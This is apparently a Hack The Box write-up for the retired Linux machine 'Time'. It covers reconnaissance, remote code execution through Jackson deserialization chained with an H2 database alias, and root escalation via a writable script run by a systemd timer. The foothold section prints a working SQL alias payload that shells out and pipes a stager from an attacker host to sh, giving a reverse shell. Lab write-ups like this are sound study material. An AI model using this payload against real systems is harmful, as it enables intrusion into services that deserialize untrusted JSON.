# Time

| | |
|---|---|
| **Platform** | Hack The Box |
| **OS** | Linux |
| **Difficulty** | Medium |
| **IP Address** | 10.10.10.214 |
| **Status** | Retired |

## Overview
Time hosts a small "Online JSON Parser & Validator" web application built on Java. Its JSON validation feature is vulnerable to Java (Jackson) deserialization, allowing arbitrary command execution and an initial foothold. Privilege escalation abuses a world-writable script executed periodically by a systemd timer running as root.

## Reconnaissance
`nmap -sC -sV` (`nmap/initial`):
```
22/tcp open  ssh   OpenSSH 8.2p1 Ubuntu 4ubuntu0.1
80/tcp open  http  Apache httpd 2.4.41 (Ubuntu): "Online JSON parser"
```

## Enumeration
The web application accepts arbitrary JSON input and validates it server-side. Submitting malformed or empty input surfaced a Java stack trace disclosing the underlying library:
```
Validation failed: Unhandled Java exception:
com.fasterxml.jackson.databind.exc.MismatchedInputException: No content to map due to end-of-input
```
The presence of Jackson `databind` and a custom validation endpoint that maps user JSON into Java objects strongly suggested a Jackson polymorphic-deserialization (`@JsonTypeInfo`/`enableDefaultTyping`) gadget-chain vulnerability, which is exploitable when the application accepts attacker-controlled `@class` type hints in the submitted JSON.

## Foothold
A JSON payload targeting a known Jackson deserialization gadget chain: abusing an H2 database driver's ability to execute arbitrary SQL/Java via a crafted data source class: was submitted to the validator. The payload defines a custom SQL alias that shells out to the OS (kept as `files/test.sql`):
```sql
CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOException {
    String[] command = {"bash", "-c", cmd};
    java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(command).getInputStream()).useDelimiter("\\A");
    return s.hasNext() ? s.next() : "";
}$$;
CALL SHELLEXEC('curl http://10.10.14.29:8001/rev|sh')
```
When wrapped in the appropriate Jackson gadget-chain JSON body and submitted to the validator endpoint, the H2 database engine embedded in the Java application executes the `SHELLEXEC` alias, which downloads and runs a reverse shell stager (`curl ... | sh`), giving a shell as the application's service account.

## Privilege Escalation
Enumeration of the host found a systemd timer unit that periodically executes a script as root. The script's file permissions allowed the low-privileged foothold user to modify its contents. Overwriting the world-writable script with an attacker-controlled command (e.g. adding a SUID bit to `/bin/bash`, or appending a reverse-shell one-liner) and waiting for the timer to fire executed the payload with root privileges, yielding a root shell.

## Lessons Learned
- Verbose Java stack traces are a strong fingerprinting signal for the underlying libraries (here, Jackson `databind`), which can point directly at known deserialization CVEs.
- Applications that deserialize user-supplied JSON into polymorphic Java types without an allow-list are vulnerable to gadget-chain RCE, even via seemingly unrelated libraries like an embedded H2 database driver.
- Systemd timers (like cron jobs) executing world-writable scripts as root are an immediate and reliable local privilege-escalation vector.

## Tools & References
- `files/test.sql`: the H2 `SHELLEXEC` alias payload used as the RCE gadget for the Jackson/H2 deserialization exploit chain.
- Jackson `databind` polymorphic deserialization / gadget chains (general class of vulnerability, no specific CVE recorded locally).
